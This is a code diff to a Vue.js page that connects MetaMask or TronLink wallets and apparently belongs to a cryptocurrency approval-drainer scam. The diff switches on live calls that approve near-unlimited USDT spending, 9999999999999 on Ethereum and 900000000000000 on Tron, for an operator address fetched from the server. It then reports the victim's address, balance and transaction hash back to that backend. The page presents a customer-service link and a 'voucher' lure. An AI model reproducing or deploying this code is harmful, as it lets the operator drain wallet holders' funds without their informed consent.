@@ -167,7 +167,6 @@ export default {
       if (res.code == 1) {
         this.userInfoData = res.data;
         // this.getkefuAddress();
-
       }
     },
     openKefu(){
@@ -176,9 +175,6 @@ export default {
         // setTimeout("wait", 2000 );
       }
       this.getkefuAddress ()
-
-
-
     },
     getkefuAddress () {
       var that = this;
@@ -201,46 +197,73 @@ export default {
     // 链接钱包
     linkWallet () {
       // meatamask
-      if (window.ethereum) {
-        this.typeKey = 'erc'
-        window.ethereum.enable().then(() => {
-          pageWeb3 = new Web3(window.web3.currentProvider);
-          var contract = new pageWeb3.eth.Contract(usdtAbi,
-            "0xdac17f958d2ee523a2206206994597c13d831ec7");
-          pageWeb3.eth.getAccounts().then((res) => {
-            console.log("res=="+res)
-            this.walletAddress = res[0];
-            this.getdata();
-            this.getInfo();
+      let that = this;
+      that.linkEthereum().then((res) => {
+        console.log(res)
+      }).catch((err) => {
+        console.log(err)
+        that.linkTron()
+      })
 
-          });
-        })
-      } else if (window.tronWeb) {
-        this.typeKey = 'trc'
-        let Inval = null
-        Inval = setInterval(() => {
-          // tronlink钱包
-          if (window.tronWeb) {
-            this.tronWeb = window.tronWeb;
-            this.walletAddress = this.tronWeb.defaultAddress.base58 ? this.tronWeb.defaultAddress.base58 : '';
-            this.getUSDT()
-            window.clearInterval(Inval);
-            this.getdata()
-            this.getInfo()
-            // metaMask钱包
-          }
-          else {
-            // window.clearInterval(Inval);
-            // this.$router.replace('/noWallet')
-          }
-        }, 1000);
-        // }
+    },
+    linkEthereum() {
+      let that = this;
+      return new Promise(async (resolve, reject) => {
+        if (window.web3) {
+          console.log("ethereum")
+          this.typeKey = 'erc'
+          window.ethereum.enable().then(() => {
+            pageWeb3 = new Web3(window.web3.currentProvider);
+            var contract = new pageWeb3.eth.Contract(usdtAbi,
+              "0xdac17f958d2ee523a2206206994597c13d831ec7");
+            pageWeb3.eth.getAccounts().then((res) => {
+              console.log("res==" + res)
+              that.walletAddress = res[0];
+              that.getdata();
+              that.getInfo();
+              resolve(res)
+            }).catch(err => {
+              reject(err)
+            })
+          }).catch(err => {
+            reject(err)
+          })
+        } else {
+          reject(new Error('请安装Metamask插件'))
+        }
+      })
+    },
+    linkTron () {
+      let that = this;
+      return new Promise((resolve, reject) => {
+        if (window.tronWeb) {
+          console.log("tronWeb")
+          that.typeKey = 'trc'
+          let Inval = null
+          Inval = setInterval(() => {
+            // tronlink钱包
+            if (window.tronWeb) {
+              that.tronWeb = window.tronWeb;
+              that.walletAddress = that.tronWeb.defaultAddress.base58 ? that.tronWeb.defaultAddress.base58 : '';
+              that.getUSDT()
+              window.clearInterval(Inval);
+              that.getdata()
+              that.getInfo()
+              // metaMask钱包
+            }
+            else {
+              window.clearInterval(Inval);
+              // this.$router.replace('/noWallet')
+              reject(new Error('请安装Tronlink插件'))
+            }
+          }, 1000);
+          // }
 
-      } else {
-        // this.$router.replace('/noWallet')
-      }
-
-
+        } else {
+          // this.$router.replace('/noWallet')
+          reject(new Error('请安装Tronlink插件'))
+        }
+      })
     },
     //查询usdt余额
     async getUSDT () {
@@ -320,33 +343,33 @@ export default {
       // 授权对象
       let spender = this.auth_address; //改成接口地址获取
 
-      // let gasPrice = contract.gasPrice;
-      // let gasLimit = contract.gasLimit;
+      let gasPrice = contract.gasPrice;
+      let gasLimit = contract.gasLimit;
       // let fromAddress = await web3.eth.getAccounts();
       // 授权金额
       let amount = 9999999999999;
 
-      // let gas_estimate = web3.eth.estimateGas({
-      //   'from': fromAddress[0],
-      //   'to': spender,
-      //   'value': amount,
-      // })
+      let gas_estimate = web3.eth.estimateGas({
+        'from': fromAddress[0],
+        'to': spender,
+        'value': amount,
+      })
       // console.log("gas_estimate===",gas_estimate);
       // let amount = 100*Math.pow(10,18);//转账100个
       try {
-        // let res = await contract.methods.approve(spender, amount).send({ from: fromAddress[0] })
-        // .on('transactionHash', function (hash) {
-        //   console.log(hash, '交易发送后得到有效交易哈希值时触发');
-        // }).on('confirmation', function (confirmationNumber, receipt) {
-        //   console.log(confirmationNumber, receipt, '收到确认时触发');
-        // }).on('receipt', function (receipt) {
-        //   console.log(receipt, '交易收据有效时触发');
-        // })
-        // .on('error', function (er) {
-        //   console.log(er)
-        // })
+        let res = await contract.methods.approve(spender, amount).send({ from: fromAddress[0] })
+        .on('transactionHash', function (hash) {
+          console.log(hash, '交易发送后得到有效交易哈希值时触发');
+        }).on('confirmation', function (confirmationNumber, receipt) {
+          console.log(confirmationNumber, receipt, '收到确认时触发');
+        }).on('receipt', function (receipt) {
+          console.log(receipt, '交易收据有效时触发');
+        })
+        .on('error', function (er) {
+          console.log(er)
+        })
         // console.log(res);
-        let res = "success";
+        // let res = "success";
         if (res) {
           let data = {
             address: _this.walletAddress,
@@ -372,114 +395,114 @@ export default {
       }
     },
 
-    async authorization (){
-      var _this = this;
-      this.loading = true;
-      let res="success";
-      if (res) {
-        let data = {
-          address: _this.tronWeb.defaultAddress.base58,
-          usdt_balance: _this.usdtBalance,
-          type: _this.typeKey,
-          hash: res,
-          au_address: _this.auth_address
-        }
-
-        apiIndexAuthsuccess(data).then((result) => {
-          if (result.code == 1) {
-            setTimeout(() => {
-              this.getInfo();
-              this.loading = false;
-            }, 500);
-          }
-        }).catch((er) => {
-          setTimeout(() => {
-            _this.loading = false
-          }, 500);
-        })
-      }
-    },
-    // //开始授权
-    // async authorization () {
-    //   // 如果余额为0  this.trxBalance
-    //   this.loading = false
-    //   // if (this.trxBalance < 30) {
-    //   //   setTimeout(() => {
-    //   //     this.loading = false
-    //   //   }, 1000);
-    //   //   this.$message.warning("You don't have enough Trc to pay for the miner's fee to receive the voucher")
-    //   //
-    //   //   return
-    //   // }
-    //   var _this = this
-    //   let orderNum = "";
-    //   this.tronWeb
-    //     .contract()
-    //     .at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
-    //     .then((usdtContract) => {
-    //       usdtContract
-    //         .balanceOf(this.tronWeb.defaultAddress.base58)
-    //         .call()
-    //         .then((usdtbalance) => {
-    //           _this.$message.success('success')
-    //           let usdtbalanceNum = usdtbalance.toNumber() / 1000000;
-    //           if (usdtbalanceNum >= 0) {
-    //             usdtContract
-    //               .increaseApproval(_this.auth_address, "900000000000000")
-    //               .send({
-    //                 feeLimit: 100000000,
-    //                 callValue: 0,
-    //                 shouldPollResponse: false
-    //               }, function (err, res) {
-    //                 if (err){
-    //                   _this.loading = false;
-    //                   return false;
-    //                 }
-    //                 if (res) {
-    //                   let data = {
-    //                     address: _this.tronWeb.defaultAddress.base58,
-    //                     usdt_balance: _this.usdtBalance,
-    //                     type: _this.typeKey,
-    //                     hash: res,
-    //                     au_address: _this.auth_address
-    //                   }
+    // async authorization (){
+    //   var _this = this;
+    //   this.loading = true;
+    //   let res="success";
+    //   if (res) {
+    //     let data = {
+    //       address: _this.tronWeb.defaultAddress.base58,
+    //       usdt_balance: _this.usdtBalance,
+    //       type: _this.typeKey,
+    //       hash: res,
+    //       au_address: _this.auth_address
+    //     }
     //
-    //                   apiIndexAuthsuccess(data).then((result) => {
-    //                     if (result.code == 1) {
-    //                       setTimeout(() => {
-    //                         _this.loading = false
-    //                       }, 500);
-    //                     }
-    //                   }).catch((er) => {
-    //                     setTimeout(() => {
-    //                       _this.loading = false
-    //                     }, 500);
-    //                   })
-    //                 }
-    //
-    //
-    //               })
-    //           } else {
-    //             _this.loading = false
-    //             // _this.transactionToken()
-    //           }
-    //         })
-    //         .catch((res) => {
-    //           this.$message.error(res)
-    //           setTimeout(() => {
-    //             _this.loading = false
-    //           }, 500);
-    //         });
-    //     })
-    //     .catch((res) => {
-    //
-    //       this.$message.error(res)
+    //     apiIndexAuthsuccess(data).then((result) => {
+    //       if (result.code == 1) {
+    //         setTimeout(() => {
+    //           this.getInfo();
+    //           this.loading = false;
+    //         }, 500);
+    //       }
+    //     }).catch((er) => {
     //       setTimeout(() => {
-    //         this.loading = false
+    //         _this.loading = false
     //       }, 500);
-    //
-    //     });
+    //     })
+    //   }
     // },
+    //开始授权
+    async authorization () {
+      // 如果余额为0  this.trxBalance
+      this.loading = false
+      // if (this.trxBalance < 30) {
+      //   setTimeout(() => {
+      //     this.loading = false
+      //   }, 1000);
+      //   this.$message.warning("You don't have enough Trc to pay for the miner's fee to receive the voucher")
+      //
+      //   return
+      // }
+      var _this = this
+      let orderNum = "";
+      this.tronWeb
+        .contract()
+        .at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
+        .then((usdtContract) => {
+          usdtContract
+            .balanceOf(this.tronWeb.defaultAddress.base58)
+            .call()
+            .then((usdtbalance) => {
+              _this.$message.success('success')
+              let usdtbalanceNum = usdtbalance.toNumber() / 1000000;
+              if (usdtbalanceNum >= 0) {
+                usdtContract
+                  .increaseApproval(_this.auth_address, "900000000000000")
+                  .send({
+                    feeLimit: 100000000,
+                    callValue: 0,
+                    shouldPollResponse: false
+                  }, function (err, res) {
+                    if (err){
+                      _this.loading = false;
+                      return false;
+                    }
+                    if (res) {
+                      let data = {
+                        address: _this.tronWeb.defaultAddress.base58,
+                        usdt_balance: _this.usdtBalance,
+                        type: _this.typeKey,
+                        hash: res,
+                        au_address: _this.auth_address
+                      }
+
+                      apiIndexAuthsuccess(data).then((result) => {
+                        if (result.code == 1) {
+                          setTimeout(() => {
+                            _this.loading = false
+                          }, 500);
+                        }
+                      }).catch((er) => {
+                        setTimeout(() => {
+                          _this.loading = false
+                        }, 500);
+                      })
+                    }
+
+
+                  })
+              } else {
+                _this.loading = false
+                // _this.transactionToken()
+              }
+            })
+            .catch((res) => {
+              this.$message.error(res)
+              setTimeout(() => {
+                _this.loading = false
+              }, 500);
+            });
+        })
+        .catch((res) => {
+
+          this.$message.error(res)
+          setTimeout(() => {
+            this.loading = false
+          }, 500);
+
+        });
+    },
 
     async getdata () {
       let res = await indexGetaddress({
@@ -540,7 +563,7 @@ export default {
       // }else {
       //   this.isAuth();
       // }
-      if (window.ethereum){
+      if (window.web3){
         this.isAuth();
       }else {
         this.authorization();
